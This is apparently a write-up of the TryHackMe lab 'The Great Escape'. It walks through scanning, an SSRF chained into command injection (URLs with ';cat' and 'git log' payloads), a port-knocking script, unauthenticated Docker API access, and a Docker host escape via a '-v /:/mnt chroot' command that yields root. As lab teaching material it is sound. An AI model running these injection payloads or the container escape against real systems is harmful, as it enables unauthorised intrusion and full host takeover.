## Introduction
This is partical room from tryhackme entitled "The Great Escape" with Medium difficulty. In this room we will learn about SSRF along with code injection, Port Knocking, Enumeration of docker and get escape from docker . Here we will exploit using SSRF then port knocking so that the docker port opens and enters docker then goes to the root of the box. Link for the room [here](https://tryhackme.com/room/thegreatescape)

## Scanning 

### Nmap 

First time we have to do is scanning the Machine :
```bash
$ nmap -sC -sV -oA nmap 10.10.50.223

Nmap scan report for 10.10.50.223
Host is up (0.34s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION

# Nmap done at Tue Feb 16 17:28:41 2021 -- 1 IP address (1 host up) scanned in 207.30 seconds
```

As we can see there is have 2 open ports, Like ssh and webserver. Now let's take a look the webserver : 

![img](/assets/thm_thegreatescape/bg_1.png)

Now i found robots.txt and contain different directory and file :

## Enumeration
### Fuzzing

`wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://10.10.50.223/FUZZ.bak.txt`
After fuzzing i found this : `http://10.10.3.187/exif-util.bak.txt` and which contains code like this:

```bat
<template>
  <section>
    <div class="container">
      <h1 class="title">Exif Utils</h1>
      <section>
        <form @submit.prevent="submitUrl" name="submitUrl">
          <b-field grouped label="Enter a URL to an image">
            <b-input
              placeholder="http://..."
              expanded
              v-model="url"
            ></b-input>
            <b-button native-type="submit" type="is-dark">
              Submit
            </b-button>
          </b-field>
        </form>
      </section>
      <section v-if="hasResponse">
        <pre>
          {{ response }}
        </pre>
      </section>
    </div>
  </section>
</template>

<script>
export default {
  name: 'Exif Util',
  auth: false,
  data() {
    return {
      hasResponse: false,
      response: '',
      url: '',
    }
  },
  methods: {
    async submitUrl() {
      this.hasResponse = false
      console.log('Submitted URL')
      try {
        const response = await this.$axios.$get('http://api-dev-backup:8080/exif', {
          params: {
            url: this.url,
          },
        })
        this.hasResponse = true
        this.response = response
      } catch (err) {
        console.log(err)
        this.$buefy.notification.open({
          duration: 4000,
          message: 'Something bad happened, please verify that the URL is valid',
          type: 'is-danger',
          position: 'is-top',
          hasIcon: true,
        })
      }
    },
  },
}
</script>

```
Now let's take a look at `exif-util/`, then i try to upload file image and using burpsuite to capture this. 

![img](/assets/thm_thegreatescape/bg_3.png)

From the information provided by burpsuite we can see that the web app made a request to `/api/exif` and the file name also changed

![img](/assets/thm_thegreatescape/bg_4.png)

Then i move to url and capture again with burpsuite, before capture i hosted files using python : `python3 -m http.server 8090`

![img](/assets/thm_thegreatescape/bg_5.png)

Then the request has changed to GET, then i try to put `http://api-dev-backup:8080/exif?url=` to request.

![img](/assets/thm_thegreatescape/bg_6.png)

### SSRF

And as we can see there is curl, Now we can check id with command `echo;id`

![img](/assets/thm_thegreatescape/bg_7.png)

And we get id of app, So we can use SSRF.Now after i looking around i'm found `dev-note.txt` in here `http://10.10.50.223/api/exif?url=http://api-dev-backup:8080/exif?url=echo;cd%20/;cat%20/root/dev-note.txt`

```

               Hey guys,

Apparently leaving the flag and docker access on the server is a bad idea, or so the security guys tell me. I've deleted the stuff.

Anyways, the password is fluffybunnies123

Cheers,

Hydra
```
Then in directory of root i found .git, Now let's check this
`http://10.10.50.223/api/exif?url=http://api-dev-backup:8080/exif?url=echo;git%20--git-dir%20/root/.git%20log`

-Hey guys,
-
-I got tired of losing the ssh key all the time so I setup a way to open up the docker for remote admin.

-Just knock on ports 42, 1337, 10420, 6969, and 63000 to open the docker tcp port.

And we have flag for root flag. As we can see there is knocked ports. then i'm check the port of docker is off.
```
$ nmap -p 2375 10.10.50.223 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-19 22:08 WIB
Nmap scan report for 10.10.50.223
Host is up (0.35s latency).

PORT     STATE  SERVICE
2375/tcp closed docker

Nmap done: 1 IP address (1 host up) scanned in 0.86 seconds
```
Now let's knocking that ports then we will be able to access the docker. I'm make little script for knocking :

```bash
#! /bin/bash
curl $1:42 -m 1
sleep 1
curl $1:1337 -m 1
sleep 1
curl $1:10420 -m 1
sleep 1
curl $1:6969 -m 1
sleep 1
curl $1:63000 -m 1
```
Let's run this : `./knock 10.10.50.223`. After run we check again the port of docker 
```
$ nmap -p 2375 10.10.50.223
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-19 22:15 WIB

Host is up (0.47s latency).

PORT     STATE SERVICE

```
## Docker

Now port of docker is open, Now lets check this. 
`docker -H 10.10.50.223:2375 info`
```bash
$ docker -H 10.10.50.223:2375 info                                                                     130 тип 1 тЪЩ

### Access Docker

Then we can access the docker. First lets check the image of docker :

`$ docker -H 10.10.50.223:2375 images`

![img](/assets/thm_thegreatescape/bg_8.png)

`$ docker -H 10.10.50.223:2375 ps`

![img](/assets/thm_thegreatescape/bg_9.png)

## Escape From Docker

in this case im going to exploit alpine to escape the docker.[here](https://gtfobins.github.io/gtfobins/docker/#shell) the link i found for exploit this.
`docker -H 10.10.50.223:2375 run -v /:/mnt --rm -it alpine:3.9 chroot /mnt bash`

```bash
$ docker -H 10.10.50.223:2375 run -v /:/mnt --rm -it alpine:3.9 chroot /mnt bash                             1 тЪЩ

To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@0f47e2d39595:/# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)

root@0f47e2d39595:~# ls
flag.txt
root@0f47e2d39595:~# cat flag.txt 
Congrats, you found the real flag!

THM{c----------REDACTED------------4}
root@0f47e2d39595:~#
``` 
Boom we can escape the docker. Now for looking the flag of web we can access frontend in the docker.
`$ docker -H 10.10.50.223:2375 exec -it dockerescapecompose_frontend_1 /bin/bash`

After looking around i found this in nginx: 
```bash
root@docker-escape:/usr/share/nginx/html/.well-known# cat security.txt 

Hey you found me!

The security.txt file is made to help security researchers and ethical hackers to contact the company about security issues.

See https://securitytxt.org/ for more information.

Ping /api/fl46 with a HEAD request for a nifty treat.
```
so We can curl head of `/api/fl46`.
```bash
$ curl --HEAD http://10.10.50.223/api/fl46

HTTP/1.1 200 OK
Server: nginx/1.19.6
Date: Fri, 19 Feb 2021 15:32:04 GMT
Connection: keep-alive
flag: THM{b8--------REDACTED------------d4}
```
We have flag of web now.

so that's all the writeup that I made now we have 3 flags, including on the web, docker, and the machine from the box

Happy hacking :D
